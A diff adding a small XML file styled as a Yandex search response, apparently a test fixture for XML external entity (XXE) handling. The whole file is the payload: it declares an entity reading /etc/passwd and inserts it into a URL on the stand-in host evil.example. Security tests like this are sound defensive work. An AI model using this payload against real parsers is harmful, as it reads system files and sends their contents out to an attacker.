@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE yandexsearch [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<yandexsearch>
+  <response><results><grouping><group>
+    <doc><url>https://evil.example/&xxe;</url><title>boom</title></doc>
+  </group></grouping></results></response>
+</yandexsearch>
